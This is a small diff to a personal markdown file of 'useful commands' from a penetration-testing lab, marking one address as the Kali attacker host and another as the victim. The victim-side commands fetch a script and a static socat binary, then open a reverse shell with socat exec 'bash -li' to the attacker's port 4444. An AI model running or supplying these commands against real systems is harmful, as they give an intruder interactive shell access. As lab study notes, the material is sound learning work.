@@ -1,3 +1,4 @@
+*10.10.10.10 -Kali host && 10.10.10.77 - Victim host
 # Useful Commands
 
 > This section will include commands / code I used in the lab environment that I found useful
@@ -17,7 +18,7 @@ Victim: ```wget http://10.10.10.10:8888/something.sh -O something.sh```
 Victim: 
 ```
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat
-chmod +x socat```
+chmod +x socat
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
 ```
         
